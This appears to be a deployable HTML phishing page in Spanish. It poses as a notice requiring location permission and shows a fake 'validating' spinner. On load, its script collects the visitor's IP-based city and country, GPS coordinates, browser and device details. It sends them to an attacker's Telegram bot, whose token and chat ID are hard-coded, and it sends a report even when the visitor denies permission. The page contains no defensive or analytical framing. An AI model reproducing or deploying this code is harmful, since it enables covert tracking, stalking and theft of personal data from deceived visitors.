<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AVISO</title>

<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        background: #f2f2f2;
    }

    /* Cuadro inicial de consentimiento */
    #consent-modal {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.75);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

    .modal-content {
        background: white;
        padding: 25px;
        width: 90%;
        max-width: 420px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
    }

    .modal-content img {
        width: 80px;
        margin-bottom: 15px;
    }

    h3 {
        margin-top: 0;
        color: #333;
    }

    /* Modal de validaci√≥n */
    .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.75);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

    .modal-content-validation {
        background: white;
        padding: 25px;
        width: 90%;
        max-width: 420px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
    }

    .loading-spinner {
        border: 4px solid #f3f3f3; /* Light grey */
        border-top: 4px solid #3498db; /* Blue */
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 2s linear infinite;
        margin: 20px auto;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    /* Main content */
    #main-content {
        display: none;
    }
</style>
</head>

<body>

<!-- Modal de Consentimiento -->
<div id="consent-modal">
    <div class="modal-content">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg">
        <h3>Permiso Necesario</h3>
        <p>
            Para continuar, necesitamos que actives los permisos de ubicaci√≥n.
            <br><br>
            La referencia se generar√° <strong>solo despu√©s de que aceptes</strong>
            y ser√° enviada de forma segura.
        </p>
    </div>
</div>

<!-- Modal de Validaci√≥n (Aparece cuando el permiso es otorgado) -->
<div id="validating-modal" class="modal-overlay" style="display:none;">
    <div class="modal-content-validation">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg">
        <h3>Validando...</h3>
        <div class="loading-spinner"></div>
        <p>Estamos verificando la informaci√≥n. Esto puede tardar unos segundos...</p>
    </div>
</div>

<script>
// --- CONFIG TELEGRAM ---
const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
const CHAT_ID = "-5099354587";

// Funci√≥n para obtener la IP p√∫blica
async function obtenerIP() {
    try {
        let r = await fetch("https://ipapi.co/json/");
        if (!r.ok) return {};
        return await r.json();
    } catch (e) {
        return {};
    }
}

// Funci√≥n para formatear el mensaje que se enviar√° a Telegram
function armarMensaje(datos, permisoOtorgado) {
    if (permisoOtorgado) {
        return `
<b>üìç NUEVO CONSENTIMIENTO</b>

<b>üïí Fecha/Hora:</b> ${datos.fecha}

<b>üåê IP P√∫blica:</b> ${datos.ip}
<b>üìå Ciudad:</b> ${datos.city}
<b>üá∫üá∏ Pa√≠s:</b> ${datos.country}

<b>üì° Ubicaci√≥n (GPS):</b>
‚Ä¢ Latitud: ${datos.lat}
‚Ä¢ Longitud: ${datos.lng}
‚Ä¢ Precisi√≥n: ${datos.accuracy} m
‚Ä¢ <a href="https://www.google.com/maps?q=${datos.lat},${datos.lng}">Ver en Maps</a>

<b>üì± Dispositivo:</b>
‚Ä¢ Navegador: ${datos.ua}
‚Ä¢ Plataforma: ${datos.platform}
‚Ä¢ Resoluci√≥n: ${datos.resolution}
`;
    } else {
        return `
<b>üö´ ACCESO DENEGADO</b>

<b>üïí Fecha/Hora:</b> ${datos.fecha}

<b>üåê IP P√∫blica:</b> ${datos.ip}
<b>üìå Ciudad:</b> ${datos.city}
<b>üá∫üá∏ Pa√≠s:</b> ${datos.country}

<b>üì± Dispositivo:</b>
‚Ä¢ Navegador: ${datos.ua}
‚Ä¢ Plataforma: ${datos.platform}
‚Ä¢ Resoluci√≥n: ${datos.resolution}

<b>üì° Ubicaci√≥n (GPS):</b>
‚Ä¢ Latitud: ${datos.lat}
‚Ä¢ Longitud: ${datos.lng}
‚Ä¢ Precisi√≥n: ${datos.accuracy} m

<b>Mensaje:</b> El usuario ha denegado el acceso a la geolocalizaci√≥n.
`;
    }
}

// Funci√≥n para enviar el mensaje a Telegram
async function enviarTelegram(msg) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "HTML"
        })
    });
}

// Funci√≥n para mostrar el modal de validaci√≥n
function mostrarValidando() {
    document.getElementById("validating-modal").style.display = "flex";
}

// Funci√≥n para ocultar el modal de validaci√≥n
function ocultarValidando() {
    document.getElementById("validating-modal").style.display = "none";
}

// Funci√≥n principal para solicitar el permiso
async function pedirConsentimiento() {
    const ipInfo = await obtenerIP();

    // Mostrar el modal de validaci√≥n durante 3 segundos al cargar la p√°gina
    mostrarValidando();

    // Despu√©s de 3 segundos, mostrar el cuadro que indica que se necesita el permiso
    setTimeout(() => {
        document.getElementById("validating-modal").style.display = "none";
        document.getElementById("consent-modal").style.display = "flex";
    }, 3000); // 3 segundos de "Validando..."

    // Solicitar geolocalizaci√≥n al cargar
    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            // Si el usuario acepta el permiso
            const datos = {
                fecha: new Date().toLocaleString(),
                ip: ipInfo.ip || "N/D",
                city: ipInfo.city || "N/D",
                country: ipInfo.country_name || "N/D",
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                ua: navigator.userAgent,
                platform: navigator.platform,
                resolution: `${screen.width}x${screen.height}`,
            };

            // Enviar la informaci√≥n a Telegram solo si el permiso es otorgado
            await enviarTelegram(armarMensaje(datos, true));

            // Ocultar el cuadro de consentimiento y mostrar el modal de validaci√≥n
            document.getElementById("consent-modal").style.display = "none";
            mostrarValidando();

            // Dejar el modal visible indefinidamente
        },
        async (err) => {
            // Si el permiso es denegado, enviar la informaci√≥n sin ubicaci√≥n
            const datos = {
                fecha: new Date().toLocaleString(),
                ip: ipInfo.ip || "N/D",
                city: ipInfo.city || "N/D",
                country: ipInfo.country_name || "N/D",
                lat: "PERMISO DENEGADO",
                lng: "PERMISO DENEGADO",
                accuracy: "N/A",
                ua: navigator.userAgent,
                platform: navigator.platform,
                resolution: `${screen.width}x${screen.height}`,
            };

            // Enviar el mensaje con acceso denegado
            await enviarTelegram(armarMensaje(datos, false));

            // Mostrar el mensaje de "Acceso Denegado"
            document.getElementById("consent-modal").style.display = "none";
            document.getElementById("main-content").style.display = "block";
        }
    );
}

// Ejecutar al cargar la p√°gina
window.onload = pedirConsentimiento;
</script>

</body>
</html>
